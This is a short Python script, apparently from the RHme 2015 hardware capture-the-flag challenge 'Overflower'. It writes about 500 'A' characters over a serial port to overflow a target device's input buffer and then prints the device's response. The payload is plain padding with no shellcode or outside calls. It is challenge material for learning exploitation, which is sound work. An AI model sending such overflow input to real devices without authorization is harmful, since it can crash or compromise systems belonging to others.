#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Info and Style
print("")
print("-------------------- RHme 2015 Overflower --------------------")
print("")

def main():
    # Write a lot of characters
    input = "A"
    for iterator in range(0, 500):
        input += "A"
    
    # Send the Attack
    serialPort.write(input + crlf)

    # Show what happens
    Serial_Flush()

    # Be proud
    print("I work!")

if __name__ == '__main__':
    main()